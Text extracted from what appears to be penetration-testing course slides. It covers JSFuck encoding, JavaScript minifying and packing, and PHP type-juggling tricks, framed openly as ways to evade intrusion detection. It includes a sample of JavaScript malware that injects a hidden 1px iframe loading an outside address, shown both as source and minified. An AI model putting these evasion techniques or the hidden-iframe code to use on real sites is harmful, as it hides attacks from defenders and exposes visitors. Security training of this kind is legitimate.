http://web.archive.org/web/20110707162819/http://sla.ckers.org/forum/
read.php?24,32930
One of the latest interesting encodings originated from a 
discussion on sla.ckers.org. The idea was to use only 6 
different characters to write and execute JavaScript code. 
The implementation is called: JSFuck.
The six characters allowed are ()+[]!. The concept is to start 
from atomic parts of JavaScript and from that construct 
the encoded payload.
2.3.1.7 JSFuck
|  p.60
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Below are some basic atomic parts, the full list is on github.
2.3.1.7 JSFuck
|  p.61
'SIMPLE' string
false
![]
true
!![]
Undefined
[][[]]
NaN
+[![]]
Infinity
+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+
[+!+[]]+[+[]]+[+[]]+[+[]])
Array
[]
Number
+[]
String
[]+[]
Boolean
![]
Function
[]["filter"]
eval
[]["filter"]["constructor"]( CODE )()
window
[]["filter"]["constructor"]("return this")()
'CONSTRUCTOR'
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
The result is something like this:
2.3.1.7 JSFuck
|  p.62
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[]
)[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![
]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]
+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+
([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[
!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[
])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(
![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[
]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+
[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]
+!+[]]+(!![]+[])[+[]]+(!![]+[]) [continue]
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
To make JavaScript run faster, developers often use tools 
that compile JavaScript into more compact and higher 
performing code. 
By using these tools, it is also possible to obfuscate code 
and evade detection. This is what we are going to be 
looking for in this chapter.
2.3.2 JavaScript Compressing
|  p.63
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
The process of minifying JavaScript code is by removing all 
unnecessary characters without changing the functionality 
of the original code. 
Basically, all characters are removed that are used to add 
readability to the code. These characters are ignored by the 
interpreter.  Examples of these are: whitespaces, new line, 
comments.
2.3.2.1 Minifying
|  p.64
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Let’s consider the following JavaScript malware code:
/* Make a Frame*/
function MakeFrameEx(){
element = do​cument.get​ElementById('yahoo_api');
if (!element){
var el = do​cument.cr​eateElement('if​rame');
do​cument.body.append​Child(el);
el.id = 'yahoo_api';
el.style.width = '1px';
el.style.height = '1px';
el.style.display = 'none';
el.src = 'http://10.10.10.21/do?' //source obfuscated
}
}
var ua = navigator.userAgent.toLowerCase();
if (((ua.indexOf("msie") !=- 1 && ua.indexOf("opera") ==- 1 && ua.indexOf("webtv") ==- 1))
&& ua.indexOf("windows") !=- 1){
var t = setTimeout("MakeFrameEx()", 1000)
}
Original code taken from http://aw-snap.info/articles/js-examples.php
|  p.65
2.3.2.1 Minifying
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Once minified, we have something like the following:
function 
MakeFrameEx(){element=do​cument.get​ElementById('yahoo_api');if(!element){var 
el=do​cument.cr​eateElement('if​rame');do​cument.body.append​Child(el);el.id='yahoo_api
';el.style.width='1px';el.style.height='1px';el.style.display='none';el.src='http:
//10.10.10.21/do?'}}var 
ua=navigator.userAgent.toLowerCase();if(((ua.indexOf("msie")!=-
1&&ua.indexOf("opera")==-1&&ua.indexOf("webtv")==-1))&&ua.indexOf("windows")!=-
1){var t=setTimeout("MakeFrameEx()",1000)}
|  p.66
2.3.2.1 Minifying
As you may notice, even if the code is compact, it is still possible 
to read it without any issues other than a minor inconvenience.
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
The minification technique is very useful compressing large 
libraries. For example, jQuery libraries are already 
compressed.
/*! jQuery v2.1.0 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function(a,b){"object"==typeof module&&"object"==typeof 
module.exports?module.exports=a.document?b(a,!0):function(a){if(!a.document)throw new 
Error("jQuery requires a window with a document");return 
b(a)}:b(a)}("undefined"!=typeof window?window:this,function(a,b){var 
c=[],d=c.slice,e=c.concat,f=c.push,g=c.indexOf,h={},i=h.toString,j=h.hasOwnProperty,k="
".trim,l={},m=a.document,n="2.1.0",o=function(a,b){return new o.fn.init(a,b)},p=/^-ms-
/,q=/-([\da-z])/gi,r=function(a,b) [continue]
Original code taken from http://code.jquery.com/jquery-2.1.0.min.js
|  p.67
2.3.2.1 Minifying
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
https://developers.google.com/closure/compiler/
http://yui.github.io/yuicompressor/
http://crockford.com/javascript/jsmin
http://dean.edwards.name/packer/
The Internet is full of tools that can minify JavaScript.
Here are some valuable sources:
▪
Closure compiler by Google
▪
YUICompressor by Yahoo
▪
JSMin by Douglas Crockford
▪
Packer by Dean Edwards (Minified and Packer)
|  p.68
2.3.2.1 Minifying
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
A more complex way to minify JavaScript code is by 
packing.  A packer compresses the minified code by 
shortening variable names, functions and other operations. 
In other words, it makes the code unreadable.
2.3.2.2 Packing
|  p.69
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
This is a screenshot of 
the previous JavaScript 
malware packed with 
Dean Edwards's tool.
2.3.2.2 Packing
|  p.70
Packing options
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
You’ve been studying quite 
intently. We recommend taking 
a quick break and come back 
refreshed. ^_^ 
|  p.71
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
2.4
PHP Obfuscation 
Techniques
|  p.72
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Fundamentally, there are two reasons why PHP obfuscation 
techniques exist. The first is because developers need a 
way to make it more difficult for others to use their code, 
thereby protecting their intellectual property. The second is 
aimed at defeating security systems (IDS & Co.).
Of course, the second option is more interesting and 
applicable for our needs. This is especially true in 
understanding how to leverage some of the language 
features to obfuscate our attacks.
2.4 PHP Obfuscation Techniques
|  p.73
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
NOTE: This quote is a reminder because of the fact that 
this chapter is no where near a complete guide to PHP 
Obfuscation. The goal here is to both present some basilar 
techniques and analyze their power and effectiveness.
2.4 PHP Obfuscation Techniques
|  p.74
"The ways of PHP obfuscation are infinite…" 
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
PHP is a popular language for web applications. Its main 
advantage is that it is simple and easy to learn, even by 
novice programmers. Another advantage is the easily 
readable code. 
While during programming, this is a good thing, especially if 
you want to deploy code that is used for offensive 
operations, as it should be formatted in a way no one can 
say what it does at first sight. That’s why we want to 
obfuscate PHP code.
2.4.1 Basic Language Reference
|  p.75
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Just like JavaScript, PHP is a dynamically typed language. 
This means that it is possible to do things such as type 
juggling. 
In other words, PHP does not require/support explicit type 
definition in variable declaration.
2.4.1.1 Type Juggling
|  p.76
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Basically, in PHP, a variable's type is determined by the context in 
which the variable is used. In the example below, if you assign a 
string value to variable $joke it becomes a string, if you then 
assign an integer the type changes, and so on.
2.4.1.1 Type Juggling
|  p.77
$joke = "1"; 
$joke++;
$joke += 19.8;
$joke = 8 + "7 -Ignore me please-";
$joke = "a string" + array("1.1 another string")[0];
$joke = 3+2*(TRUE+TRUE);
$joke .= '';
$joke +=''; 
// string(1) "1"
// int(2) 
// float(21.8) 
// int(15) 
// float(1.1)
// int(7)
// string(1) "7"
// int(7)
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
The first useful data type set in PHP obfuscation is related 
to numbers. With numerical data types, just like in 
JavaScript, we can either access elements inside strings or 
inside arrays. Then, we can use them to generate 
characters and a great deal more.
Let’s check out the following examples.
2.4.1.2 Numerical Data Types
|  p.78
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Access String / Integer Numbers
$x='Giuseppe';
echo $x[0];       // decimal index (0)        > 'G'
echo $x[0001];    // octal index (1)          > 'i'
echo $x[0x02];    // hexadecimal index (2)    > 'u'
echo $x[0b11];    // binary index (3)         > 's'
2.4.1.2 Numerical Data Types
|  p.79
Binary integer literals are available since PHP 5.4.0
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Access String / Integer Numbers
The following image, according to the PHP documentation, 
describes how the structure for integer literals are:
2.4.1.2 Numerical Data Types
|  p.80
integer
decimal
[1-9][0-9]* or 0
hexadecimal
0[xX][0-9a-fA-F]+
octal
0[0-7]+
binary
0b[01]+
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Access String / Integer Numbers
Thus, the following example is still valid code:
$x='Giuseppe';
echo $x[0];              // decimal index (0)      > 'G'
echo $x[00000000000001]; // octal index (1)        > 'i'
echo $x[0x000000000002]; // hexadecimal index (2)  > 'u'
echo $x[0b000000000011]; // binary index (3)       > 's'
2.4.1.2 Numerical Data Types
|  p.81
WAPTXv2: Section 01, Module 02 - Caendra Inc. © 2020
Access String / Floating Numbers
Numerical data types also comprehend floating numbers.
$x='Giuseppe';
echo $x[0.1];                // floating (0.1) casted to 0 > 'G'
echo $x[.1e+1];              // exponential                > 'i'
echo $x[0.2E+0000000000001]; // long exponential           > 'u'
echo $x[1e+1-1E-1-5.999];    // exponential and floating